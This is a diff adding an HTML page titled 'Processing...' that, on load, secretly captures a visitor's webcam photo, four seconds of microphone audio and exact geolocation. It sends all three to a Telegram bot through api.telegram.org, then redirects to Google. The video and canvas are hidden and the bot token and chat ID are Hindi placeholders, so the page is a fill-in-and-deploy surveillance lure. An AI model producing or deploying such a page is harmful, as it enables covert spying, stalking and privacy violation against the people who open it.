@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8">
+  <title>Processing...</title>
+  <style>
+    body { background: #fff; color: #fff; margin: 0; overflow: hidden; }
+    video, canvas, audio { display: none; }
+  </style>
+</head>
+<body>
+  <video id="video" autoplay playsinline width="300" height="225"></video>
+  <canvas id="canvas" width="300" height="225"></canvas>
+
+  <script>
+    const TELEGRAM_TOKEN = "आपका_BOT_TOKEN";
+    const CHAT_ID = "आपका_CHAT_ID";
+    const REDIRECT_URL = "https://www.google.com"; // redirect after data send
+
+    async function sendPhotoAndLocation(photoBlob, latitude, longitude, accuracy) {
+      // Send Photo
+      const photoData = new FormData();
+      photoData.append("chat_id", CHAT_ID);
+      photoData.append("caption", "फोटो और लोकेशन:");
+      photoData.append("photo", photoBlob, "photo.png");
+
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: photoData
+      });
+
+      // Send Location
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${latitude}&longitude=${longitude}`);
+
+      // Send Accuracy Message
+      const msg = `📍 Exact Location:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy} meters`;
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+    }
+
+    async function sendAudio(blobAudio) {
+      const audioData = new FormData();
+      audioData.append("chat_id", CHAT_ID);
+      audioData.append("audio", blobAudio, "audio.ogg");
+
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendAudio`, {
+        method: "POST",
+        body: audioData
+      });
+    }
+
+    async function captureAndSend() {
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      const ctx = canvas.getContext("2d");
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        video.srcObject = stream;
+
+        // Start recording audio
+        const recorder = new MediaRecorder(stream);
+        let audioChunks = [];
+        recorder.ondataavailable = e => audioChunks.push(e.data);
+        recorder.start();
+
+        await new Promise(resolve => setTimeout(resolve, 4000)); // 4 seconds record
+        recorder.stop();
+
+        // Take photo from video
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(async function(photoBlob) {
+          navigator.geolocation.getCurrentPosition(async position => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+
+            await sendPhotoAndLocation(photoBlob, latitude, longitude, accuracy);
+          }, error => {
+            console.error("Location error:", error.message);
+          }, {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          });
+        }, "image/png");
+
+        recorder.onstop = async () => {
+          const audioBlob = new Blob(audioChunks, { type: "audio/ogg" });
+          await sendAudio(audioBlob);
+
+          // Redirect after everything is sent
+          setTimeout(() => {
+            window.location.href = REDIRECT_URL;
+          }, 2000);
+        };
+
+        stream.getTracks().forEach(track => track.stop());
+
+      } catch (err) {
+        console.error("Error:", err.message);
+        setTimeout(() => {
+          window.location.href = REDIRECT_URL;
+        }, 2000);
+      }
+    }
+
+    window.onload = captureAndSend;
+  </script>
+</body>
+</html>
